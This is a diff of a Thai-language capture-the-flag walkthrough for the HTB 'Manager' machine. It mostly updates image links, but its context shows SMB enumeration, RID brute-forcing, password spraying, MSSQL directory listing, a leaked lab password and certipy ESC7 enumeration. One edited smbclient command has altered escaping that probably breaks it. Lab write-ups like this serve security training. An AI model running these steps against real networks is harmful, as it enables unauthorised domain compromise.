@@ -90,21 +90,21 @@ Host script results:
 |_    Message signing enabled and required
 |_clock-skew: mean: 6h38m36s, deviation: 0s, median: 6h38m35s
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
 Nmap done: 1 IP address (1 host up) scanned in 98.49 seconds
 
 ```
 
 ## TCP 80 
 จากการตรวจสอบ HTTP ด้วย domain manager.htb ก็จะพบว่าไม่มีอะไรที่ดูน่าสนใจ 
-![[Challenge/HTB Challenge/Manager/IMG/001.png]]
+![](./IMG/001.png)
 
 ## SMB 445 
 
 ทำการตรวจสอบ SMB จะพบว่ามีข้อมูลไฟล์แชร์อยู่ ซึ่งจะเห็นได้ว่าไม่มีไฟล์หรือโฟลเดอร์ที่ไปต่อได้
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
-└─$ smbclient -L \\\\10.10.11.236\\ -N
+└─$ smbclient -L \\10.10.11.236\ -N
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -172,7 +172,7 @@ netexec smb 10.10.11.236 -u guest -p '' --rid-brute
 
 netexec smb 10.10.11.236 -u users -p users  --continue-on-success --no-brute
 ```
-![[Challenge/HTB Challenge/Manager/IMG/002.png]]
+![](./IMG/002.png)
 
 ## TCP 1433 MSSQL
 
@@ -186,7 +186,7 @@ impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 xp_dirtree c:\inetpub\wwwroot
 ```
 
-![[Challenge/HTB Challenge/Manager/IMG/003.png]]
+![](./IMG/003.png)
 
 
 จากข้อมูลข้าต้นทำให้เราเห็นว่ามีไฟล์ website-backup-27-07-23-old.zip ที่อยู่ภายใต้ www root ซึ่งเราสามารถ Download file ดังกล่าวมาได้ 
@@ -196,7 +196,7 @@ wget http://10.10.11.236/website-backup-27-07-23-old.zip
 unzip ./website-backup-27-07-23-old.zip
 ```
 
-![[Challenge/HTB Challenge/Manager/IMG/004.png]]
+![](./IMG/004.png)
 
 จะเห็นได้ว่ามีข้อมูลของ user reven:R4v3nBe5tD3veloP3r!123
 ```xml
@@ -229,7 +229,7 @@ unzip ./website-backup-27-07-23-old.zip
 for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service manager.htb  -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' ; done
 ```
 
-![[Challenge/HTB Challenge/Manager/IMG/005.png]]
+![](./IMG/005.png)
 
 จากผลลัพธ์ด้านบนจะเห็นว่าสามารถใช้ winrm ได้ 
 # Shell as raven 
@@ -254,7 +254,7 @@ pip install certipy-ad
 certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
 ```
 
-![[Challenge/HTB Challenge/Manager/IMG/006.png]]
+![](./IMG/006.png)
 
 จากผลที่ได้ระบุว่าผู้ใช้ Raven มีสิทธิ์ที่เป็นอันตรายเป็นอย่างยิ่ง ซึ่งการมีสิทธิ์ “ManageCA” เหนือกว่า (Certification Authority) ผู้ออกใบรับรอง นี่หมายความว่าด้วยการใช้ประโยชน์จากสถานการณ์ ESC7 เราอาจยกระดับสิทธิ์ของเราเป็น Domain Admin ได้ 
 
@@ -330,7 +330,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 
 จากการตรวจสอบจะเห็นว่า Raven มีสิทธิ ManageCA แล้ว 
-![[Challenge/HTB Challenge/Manager/IMG/007.png]]
+![](./IMG/007.png)
 
 ## administrator certificate 
 
